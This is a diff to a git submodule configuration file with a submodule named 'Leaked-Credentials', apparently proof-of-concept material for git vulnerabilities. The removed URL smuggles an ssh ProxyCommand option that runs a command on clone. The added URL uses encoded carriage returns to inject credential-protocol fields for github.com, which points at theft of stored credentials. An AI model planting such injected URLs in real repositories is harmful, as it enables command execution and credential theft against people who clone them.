@@ -1,3 +1,3 @@
 [submodule "Leaked-Credentials"]
 	path = Leaked-Credentials
-	url = ssh://209.145.54.235:2222/aaaaa/aaaaaaaaa '-oProxyCommand="touch /tmp/foo"'
+	url = ssh://%0dprotocol=ssh%0dhost=github.com%0d@207.244.255.245:2222/ffff/aaaaa
